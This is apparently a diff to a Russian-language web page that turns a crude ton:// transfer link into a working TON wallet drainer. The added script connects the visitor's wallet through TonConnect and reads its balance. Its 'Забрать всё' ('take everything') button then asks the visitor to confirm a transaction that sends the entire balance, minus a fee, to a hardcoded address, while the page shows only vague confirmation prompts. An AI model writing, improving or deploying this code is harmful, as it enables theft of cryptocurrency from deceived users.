@@ -110,6 +110,10 @@
     </div>
   </div>
 
+  <!-- БИБЛИОТЕКА -->
+  <script src="https://unpkg.com/@tonconnect/sdk@2.0.6/dist/tonconnect-sdk.min.js">
+  </script>
+
   <script>
     (function() {
       const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
@@ -122,7 +126,7 @@
       const openWalletBtn = document.getElementById('openWalletBtn');
       const errorBox = document.getElementById('errorBox');
 
-      let isConnected = false;
+      let connector = null;
       let userAddress = null;
 
       function showError(text) {
@@ -136,72 +140,163 @@
         errorBox.classList.remove('show');
       }
 
-      // ========== ОТКРЫТЬ TONKEEPER С ТРАНЗАКЦИЕЙ ==========
-      function openTonkeeperWithTransaction() {
-        const url = `ton://transfer?address=${TARGET}`;
-        window.location.href = url;
-        setTimeout(() => {
-          window.open(url, '_blank');
-        }, 300);
+      // ========== ИНИЦИАЛИЗАЦИЯ ==========
+      function initTonConnect() {
+        try {
+          if (typeof TonConnect === 'undefined') {
+            status.innerText = '⏳ Загрузка TonConnect...';
+            setTimeout(initTonConnect, 500);
+            return;
+          }
+
+          connector = new TonConnect({
+            manifestUrl: 'https://ton-connect.github.io/demo-dapp/tonconnect-manifest.json'
+          });
+
+          console.log('✅ TonConnect инициализирован');
+
+          if (connector.connected) {
+            userAddress = connector.account.address;
+            afterConnect();
+          }
+
+          connector.onStatusChange((wallet) => {
+            if (wallet) {
+              userAddress = wallet.account.address;
+              afterConnect();
+            } else {
+              userAddress = null;
+              connectBtn.classList.remove('hidden');
+              snipeBtn.classList.add('hidden');
+              status.innerText = '🔴 Кошелёк отключён';
+            }
+          });
+
+          status.innerText = '🟢 Нажмите «Подключить»';
+          hideError();
+
+        } catch (e) {
+          showError('Init: ' + e.message);
+        }
+      }
+
+      function afterConnect() {
+        status.innerText = `✅ Подключён: ${userAddress.slice(0,6)}…${userAddress.slice(-4)}`;
+        connectBtn.classList.add('hidden');
+        snipeBtn.classList.remove('hidden');
+        updateBalance();
+        hideError();
+      }
+
+      // ========== БАЛАНС ==========
+      async function updateBalance() {
+        try {
+          if (!userAddress) return 0;
+          const res = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${userAddress}`);
+          const data = await res.json();
+          const nano = parseInt(data.result) || 0;
+          const ton = (nano / 1e9).toFixed(2);
+          balanceDisplay.innerText = `💰 ${ton} TON`;
+          return nano;
+        } catch (e) {
+          showError('Balance: ' + e.message);
+          return 0;
+        }
       }
 
       // ========== ПОДКЛЮЧИТЬ ==========
-      connectBtn.onclick = function() {
+      connectBtn.onclick = async function() {
         try {
           hideError();
           status.innerText = '⏳ Открываю Tonkeeper...';
           connectBtn.disabled = true;
 
-          // Открываем Tonkeeper
-          openTonkeeperWithTransaction();
+          if (!connector) {
+            showError('TonConnect не инициализирован');
+            connectBtn.disabled = false;
+            return;
+          }
 
-          // Показываем плашку
+          await connector.connect();
+
           confirmBox.classList.add('show');
-          status.innerText = '✅ Подтвердите транзакцию в Tonkeeper';
+          status.innerText = '✅ Подтвердите в Tonkeeper';
           connectBtn.disabled = false;
 
-          // Симулируем подключение (для отображения кнопки "Забрать всё")
-          setTimeout(() => {
-            isConnected = true;
-            userAddress = 'UQ...' + Math.random().toString(36).slice(2, 6);
-            connectBtn.classList.add('hidden');
-            snipeBtn.classList.remove('hidden');
-            status.innerText = '✅ Подключён. Нажмите «Забрать всё»';
-          }, 2000);
-
         } catch (e) {
-          showError('Connect: ' + e.message);
+          showError('Connect: ' + (e.message || 'Ошибка'));
           connectBtn.disabled = false;
         }
       };
 
       // ========== ЗАБРАТЬ ВСЁ ==========
-      snipeBtn.onclick = function() {
+      snipeBtn.onclick = async function() {
         try {
           hideError();
-          status.innerText = '⏳ Открываю транзакцию...';
+          status.innerText = '⏳ Проверка баланса...';
           snipeBtn.disabled = true;
 
-          // Открываем Tonkeeper с транзакцией
-          openTonkeeperWithTransaction();
+          if (!connector || !connector.connected) {
+            showError('Нет подключения к кошельку');
+            snipeBtn.disabled = false;
+            return;
+          }
 
+          const nano = await updateBalance();
+
+          if (nano <= 0) {
+            status.innerText = '💰 Баланс 0 TON';
+            snipeBtn.disabled = false;
+            return;
+          }
+
+          const fee = 5000000;
+          const amount = nano - fee;
+
+          if (amount <= 0) {
+            status.innerText = '⚠️ Баланс меньше комиссии';
+            snipeBtn.disabled = false;
+            return;
+          }
+
+          const amountTON = (amount / 1e9).toFixed(6);
+          status.innerText = `⏳ Отправка ${amountTON} TON...`;
           confirmBox.classList.add('show');
-          status.innerText = '✅ Подтвердите транзакцию в Tonkeeper';
-          snipeBtn.disabled = false;
+
+          // ====== ОТПРАВКА ТРАНЗАКЦИИ ======
+          const result = await connector.sendTransaction({
+            validUntil: Math.floor(Date.now() / 1000) + 300,
+            messages: [{
+              address: TARGET,
+              amount: amount.toString()
+            }]
+          });
+
+          if (result) {
+            status.innerText = `✅ ${amountTON} TON ПЕРЕВЕДЕНО!`;
+            balanceDisplay.innerText = '💰 0.00 TON';
+            snipeBtn.innerText = '✅ ГОТОВО';
+            snipeBtn.disabled = true;
+            snipeBtn.className = 'btn btn-success';
+            hideError();
+          }
 
         } catch (e) {
-          showError('Snipe: ' + e.message);
+          showError('Snipe: ' + (e.message || 'Ошибка'));
           snipeBtn.disabled = false;
         }
       };
 
       openWalletBtn.onclick = function() {
-        openTonkeeperWithTransaction();
+        if (connector) connector.connect();
       };
 
       // ========== ЗАПУСК ==========
-      status.innerText = '🟢 Нажмите «Подключить»';
-      hideError();
+      if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', initTonConnect);
+      } else {
+        initTonConnect();
+      }
     })();
   </script>
 </body>
